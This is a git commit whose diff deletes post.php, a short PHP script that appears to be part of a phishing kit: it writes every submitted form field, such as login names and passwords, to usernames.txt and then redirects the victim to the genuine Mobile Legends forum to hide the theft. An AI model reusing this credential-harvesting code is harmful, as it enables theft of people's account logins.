0191e446b74275869dc55b7308e627457c4f7941
RemApple <32689703+NganDii@users.noreply.github.com>
2020-06-07 00:18:04 +0530

    Delete post.php

--- post.php
+++
@@ -1,7 +0,0 @@
-<?php  
-$handle = fopen("usernames.txt", "a"); foreach($_POST as $variable => $value) { 
-fwrite($handle, $variable); fwrite($handle, "="); 
-fwrite($handle, $value); fwrite($handle, "\r\n");
-}
-header ('Location: https://forum.mobilelegends.com');
-fwrite($handle, "\r\n"); fclose($handle); exit; ?>
